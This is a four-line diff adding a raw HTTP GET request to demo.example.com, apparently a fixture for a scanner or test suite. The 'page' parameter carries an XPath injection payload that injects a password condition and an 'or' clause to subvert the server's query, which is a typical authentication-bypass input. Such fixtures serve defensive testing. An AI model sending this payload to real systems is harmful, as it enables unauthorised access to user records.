@@ -1,0 +1,4 @@
+GET /a?page=///*x*/users/user[password/text()%3D'']%20or%20' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
